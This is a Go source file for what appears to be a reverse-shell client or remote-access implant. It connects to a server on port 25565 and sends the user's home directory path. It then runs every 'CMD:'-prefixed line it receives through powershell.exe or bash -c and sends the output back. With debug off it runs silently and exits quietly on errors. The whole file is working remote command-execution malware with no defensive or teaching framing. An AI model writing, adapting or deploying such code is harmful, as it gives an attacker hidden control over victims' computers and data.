package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"runtime"
	"os/exec"
)

//globals
var conn net.Conn
var terminator = "__END__\n"
var detectedOs string
var myIP string
var currentDir string;
var debug = false;

/**
function that handles errors so I don't have to write ts EVERY SINGLE TIME
param err - the error to print out
*/
 func handleErr(err error) {
	if err != nil {
		if(debug) { fmt.Println("Error! : ", err) }
		os.Exit(1)
	}
 }

 /**
 Detects the OS of the client system.
 */
 func detectOs() {
	switch runtime.GOOS {
	case "windows":
		if(debug) { fmt.Println("Windows detected!") }
		detectedOs = "windows"
		currentDir = "C:\\"
	case "linux":
		if(debug) { fmt.Println("Linux Detected!") }
		detectedOs = "linux"
		currentDir = "~"
	default:
		if(debug) { fmt.Println("Unsupported os! some things might not work as expected...") }
	}
 }

func initListener(serveraddr string) {
	var err error
	conn, err = net.Dial("tcp", serveraddr + ":25565")
	myIP = conn.LocalAddr().String()
	handleErr(err)

	if(debug) { fmt.Println("Listener now from: ", conn.LocalAddr().String()) }
}

func listen() {
	userdir, err := os.UserHomeDir()
	handleErr(err)
	// fmt.Println(userdir)
	conn.Write([]byte(userdir))
	scan()
}

func scan() {
	var cmd string
	scanner := bufio.NewScanner(conn)
	for (scanner.Scan()) {
		cmd = scanner.Text()
		if(strings.Contains(cmd, "CMD:")) {
			cmd = cmd[5:]
			if(debug) { fmt.Println("Running command: " + cmd) }
			RunLogged(cmd)
		}

		
	}

	if err := scanner.Err(); err != nil {
		handleErr(err)
	}
}

func RunLogged(cmd string) {
	var out *exec.Cmd
	var output []byte
	var tempout []byte
	output = []byte(("Message from " + myIP + "\n"))

	if runtime.GOOS == "windows" {
		if(strings.Contains(cmd, "cd")) {
			currentDir = cmd[3:]
			if(debug) { fmt.Println("currentdir: " + currentDir) }
			out = exec.Command("powershell.exe",cmd)
		} else {
			out = exec.Command("powershell.exe","cd " + currentDir + "; " + cmd)
		}
	} else {
		out = exec.Command("bash", "-c", cmd)
	}
	tempout, _ = out.CombinedOutput()
	output = append(output, tempout...)
	output = append(output, []byte("__END__\n")...)

	conn.Write(output)
	if (debug) { fmt.Println("cmd completed") }
	
}
 
 func main() {
	if (debug) { fmt.Println("Initializing Client...") } 
	detectOs()
	initListener("127.0.0.1")
	listen()	
	
 }





